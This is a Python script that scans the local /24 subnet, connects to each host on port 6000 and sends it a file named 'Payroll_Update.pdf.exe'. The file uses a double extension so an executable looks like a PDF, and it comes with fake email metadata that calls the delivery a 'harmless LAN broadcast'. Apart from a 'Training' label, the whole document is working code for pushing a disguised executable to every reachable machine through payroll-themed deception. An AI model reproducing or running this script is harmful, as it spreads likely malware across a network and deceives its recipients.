import socket
import json
import os
import ipaddress

PORT = 6000
ATTACHMENT = "Payroll_Update.pdf.exe"  

email = {
    "from": "Notifier <noreply@system>",
    "subject": "Training Broadcast",
    "message": "This is a harmless LAN broadcast message.",
    "attachment": os.path.basename(ATTACHMENT)
}

def get_local_subnet():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return ipaddress.ip_network(local_ip + "/24", strict=False)

def send_to_target(ip):
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((str(ip), PORT))

        metadata_bytes = json.dumps(email).encode()
        s.send(str(len(metadata_bytes)).encode().ljust(16))
        s.send(metadata_bytes)

        file_size = os.path.getsize(ATTACHMENT)
        s.send(str(file_size).encode().ljust(16))

        with open(ATTACHMENT, "rb") as f:
            while chunk := f.read(4096):
                s.send(chunk)

        s.close()
        print(f"[DELIVERED] {ip}")
        return True

    except:
        return False

def broadcast():
    success = []
    subnet = get_local_subnet()

    print(f"[+] Broadcasting on subnet: {subnet}\n")

    for ip in subnet.hosts():  # skips network + broadcast
        if send_to_target(ip):
            success.append(str(ip))

    print("\n=== BROADCAST SUMMARY ===")
    print("Delivered to:", len(success))
    for ip in success:
        print(" →", ip)

if __name__ == "__main__":
    broadcast()
